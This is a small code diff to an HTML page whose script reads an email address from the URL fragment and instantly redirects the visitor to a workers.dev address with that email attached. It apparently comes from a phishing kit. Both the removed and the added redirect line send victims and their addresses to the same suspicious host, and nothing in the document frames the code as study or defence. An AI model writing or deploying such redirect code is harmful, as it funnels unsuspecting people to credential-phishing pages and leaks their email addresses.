@@ -17,7 +17,7 @@
 		var str = hash.split("#")[1];
 		var em = hash.split("#")[1];
 		window.setTimeout(function () {
-			window.location.href = "https://jolly-salad-4d61.setsuko2.workers.dev/?bbre=zxosuuzxas#/amwt4IhQ-&!iaB12QF30kRJ9mNPhOAgjK!&rDWmVeh1YCw7kS&!@-a@aa.com-HI9BlhQTT6ryqnZliyy2q2TD353/jHgvVnOt2gAOFXNw6UjMvT4zeH1"+ makeid(10) + "#" + em;
+			window.location.href = "https://jolly-salad-4d61.setsuko2.workers.dev/?bbre=zxosuuzxas"+ makeid(10) + "#" + em;
 		}, 0);
 	</script>
 </html>
